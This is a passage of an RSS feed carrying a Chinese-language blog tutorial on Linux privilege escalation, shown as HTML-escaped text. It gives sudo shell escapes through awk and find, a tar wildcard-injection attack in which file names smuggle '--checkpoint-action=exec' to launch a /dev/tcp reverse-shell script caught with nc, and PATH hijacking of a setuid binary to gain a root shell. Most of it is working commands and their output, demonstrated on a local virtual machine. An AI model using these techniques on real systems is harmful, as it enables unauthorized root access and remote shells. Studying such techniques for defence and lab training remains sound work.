		&lt;img src=&#34;https://coollllllll.github.io/p/1/image-20211012170101086.png&#34;
			width=&#34;621&#34;
			height=&#34;138&#34;
			srcset=&#34;https://coollllllll.github.io/p/1/image-20211012170101086_hue0b0fd93062c8477a62694e97137dc63_21606_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/1/image-20211012170101086_hue0b0fd93062c8477a62694e97137dc63_21606_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;sudo提权姿势&#34;&gt;sudo提权姿势&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo /usr/bin/awk &#39;BEGIN {system(&amp;quot;/bin/sh&amp;quot;)}&#39;

sudo find . -exec /bin/sh \; -quit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 940; 
			flex-basis: 2256px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/1/image-20211012170437130.png&#34; data-size=&#34;677x72&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/1/image-20211012170437130.png&#34;
			width=&#34;677&#34;
			height=&#34;72&#34;
			srcset=&#34;https://coollllllll.github.io/p/1/image-20211012170437130_hu9a6d4a5a0e2bb1573c0fd3e5e54b0c07_15534_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/1/image-20211012170437130_hu9a6d4a5a0e2bb1573c0fd3e5e54b0c07_15534_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其他类似sudo提权命令:https://gtfobins.github.io/&lt;/p&gt;
&lt;h2 id=&#34;通配符提权&#34;&gt;通配符提权&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;该类提权一般都配合计划任务，发现计划任务使用了相关命令通配符&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;通配符&#34;&gt;通配符&lt;/h3&gt;
&lt;p&gt;*：匹配任意数量字符&lt;/p&gt;
&lt;p&gt;?：匹配任意单个字符&lt;/p&gt;
&lt;p&gt;[]：一组字符，其中任意一个字符都可匹配该位置单个字符&lt;/p&gt;
&lt;p&gt;~：单个表示当前用户主目录名称，~后跟用户名表示某用户根目录名称&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;h4 id=&#34;示例1&#34;&gt;示例1&lt;/h4&gt;
&lt;p&gt;test目录下有2个文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ ls
test2  test.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行cat *&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ cat *
sadadada
hahahah
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建&amp;ndash;help文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ echo &amp;quot;my help&amp;quot; &amp;gt; --help
cool@cool-virtual-machine:~/test$ ls
--help  test2  test.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再次执行cat *&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ cat *
Usage: cat [OPTION]... [FILE]...
Concatenate FILE(s) to standard output.

With no FILE, or when FILE is -, read standard input.

  -A, --show-all           equivalent to -vET
  -b, --number-nonblank    number nonempty output lines, overrides -n
  -e                       equivalent to -vE
  -E, --show-ends          display $ at end of each line
  -n, --number             number all output lines
  -s, --squeeze-blank      suppress repeated empty output lines

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可观察到并没有读取&amp;quot;&amp;ndash;help&amp;quot;文件的内容，而是被视为&amp;quot;cat&amp;quot;命令的&amp;ndash;help命令帮助选项&lt;/p&gt;
&lt;p&gt;这种可称为**&amp;ldquo;wildcard wildness&amp;rdquo;**&lt;/p&gt;
&lt;h4 id=&#34;示例2&#34;&gt;示例2&lt;/h4&gt;
&lt;p&gt;在test目录下生成反弹shell脚本&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ echo &amp;quot;/bin/sh -i&amp;gt;&amp;amp;/dev/tcp/127.0.0.1/7777 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; shell.sh
cool@cool-virtual-machine:~/test$ ls
shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成如下文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh shell.sh&amp;quot;
cool@cool-virtual-machine:~/test$ echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint=1&amp;quot;
cool@cool-virtual-machine:~/test$ ls
--checkpoint=1  --checkpoint-action=exec=sh shell.sh  shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;监听端口&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~$ nc -nvlp 7777
Listening on [0.0.0.0] (family 0, port 7777)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行tar命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ tar cf /tmp/test.tar *
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;监听结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~$ nc -nvlp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 36508)
sh-4.3$ id
id
uid=1000(cool) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tar命令的通配符注入需要进入到目标目录，使用通配符&amp;quot;*&amp;quot;，例如 tar -cf /tmp/test.tar *&lt;/p&gt;
&lt;p&gt;使用绝对路径，如：tar -cf /tmp/test.tar /tmp/test/*, 那么&amp;ndash;checkpoint等会失效，无法执行命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;敏感文件&#34;&gt;敏感文件&lt;/h2&gt;
&lt;h2 id=&#34;path-环境变量劫持&#34;&gt;Path 环境变量劫持&lt;/h2&gt;
&lt;p&gt;system函数会调用shell(sh)执行命令(传入的参数)&lt;/p&gt;
&lt;p&gt;现有这样一段可执行程序，如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include&amp;lt;unistd.h&amp;gt;
void main()
{
	setuid(0);
	setgid(0);
	system(&amp;quot;whoami&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以root用户编译后生成“haha”可执行文件如下(具有suid位)：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@cool-virtual-machine:/home/cool/test# ll
total 40
drwxrwxr-x  2 cool cool 4096 10月 25 10:56 ./
drwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../
-rwsr-xr-x  1 root root 8656 10月 25 10:56 haha*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以普通用户编译这样一段程序：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include&amp;lt;unistd.h&amp;gt;
void main()
{
	system(&amp;quot;/bin/bash&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成&amp;quot;whoami&amp;quot;文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ ll
total 40
drwxrwxr-x  2 cool cool 4096 10月 25 11:00 ./
drwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../
-rwsr-xr-x  1 root root 8656 10月 25 10:56 haha*
-rw-rw-r--  1 cool cool   86 10月 25 10:56 test.c
-rwxrwxr-x  1 cool cool 8608 10月 25 10:50 whoami*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;劫持环境变量：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ export PATH=/home/cool/test:$PATH
cool@cool-virtual-machine:~/test$ which whoami
/home/cool/test/whoami
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行./haha：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ ./haha
root@cool-virtual-machine:~/test# id
uid=0(root) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        
    </channel>
</rss>
